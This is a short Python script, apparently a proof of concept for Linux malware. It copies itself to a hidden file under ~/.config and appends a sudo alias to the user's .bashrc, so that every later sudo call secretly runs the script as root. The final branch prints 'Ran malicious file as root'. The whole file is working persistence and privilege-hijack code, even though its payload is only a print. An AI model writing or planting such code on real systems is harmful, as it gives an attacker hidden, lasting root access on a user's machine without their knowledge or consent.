#!/usr/bin/env python3

import os
import sys
import shutil
import pwd

#Get the current file location.
currentPath = os.path.abspath(__file__)

#Identify if the file was run with the sudo alias.
if(len(sys.argv) == 1):
        #No arguments were passed, which means this is the first execution.
        #Copy the file to a location where it can stay hidden.
        userName = pwd.getpwuid( os.getuid() )[ 0 ]
        homeDirectory = os.path.join("/home/", userName)
        configFolder = os.path.join(homeDirectory, ".config")
        if(not os.path.isdir(configFolder)):
                os.mkdir(configFolder)
        targetFile = os.path.join(configFolder, "data-contributer.py")
        #Make sure that we haven't already put the file in the hidden location.
        if(not os.path.isfile(targetFile)):
                shutil.copy(currentPath, targetFile)
                #Build an alias command that hooks into sudo.
                aliasCommand = "alias sudo=\"/usr/bin/sudo python2 " + targetFile + " sudoed; /usr/bin/sudo\""
                os.system(aliasCommand)
                #Add the alias to the .bashrc file
                bashrcPath = os.path.join(homeDirectory, ".bashrc")
                file = open(bashrcPath, "a+")
                file.write("\n")
                file.write(aliasCommand)
                file.close()
else:
        print("Ran malicious file as root")
